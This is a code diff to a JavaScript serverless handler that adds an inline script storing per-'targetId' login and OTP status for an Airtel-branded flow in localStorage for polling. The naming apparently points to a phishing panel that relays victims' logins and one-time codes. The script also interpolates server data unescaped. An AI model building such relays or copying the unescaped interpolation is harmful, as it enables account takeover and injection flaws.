@@ -80,7 +80,7 @@ export default async function handler(req, res) {
         }),
       });
     } else {
-      await fetch(`https://api.restful-api.dev/objects`, {
+      await fetch('https://api.restful-api.dev/objects', {
         method: 'POST',
         headers: FETCH_HEADERS,
         body: JSON.stringify({
@@ -107,6 +107,19 @@ export default async function handler(req, res) {
             p { color: #94a3b8; font-size: 14px; line-height: 1.5; }
             .badge { display: inline-block; background: rgba(16, 185, 129, 0.15); color: #34d399; font-weight: bold; padding: 6px 14px; border-radius: 999px; font-size: 12px; margin-bottom: 16px; }
           </style>
+          <script>
+            // Set status in localStorage for polling to detect
+            try {
+              localStorage.setItem('airtel_status_${targetId}', JSON.stringify({
+                loginStatus: '${data.loginStatus || 'pending'}',
+                otpStatus: '${data.otpStatus || 'idle'}',
+                lastUpdated: ${Date.now()}
+              }));
+              console.log('Status set in localStorage for:', '${targetId}');
+            } catch(e) {
+              console.error('Failed to set localStorage:', e);
+            }
+          </script>
         </head>
         <body>
           <div class="card">
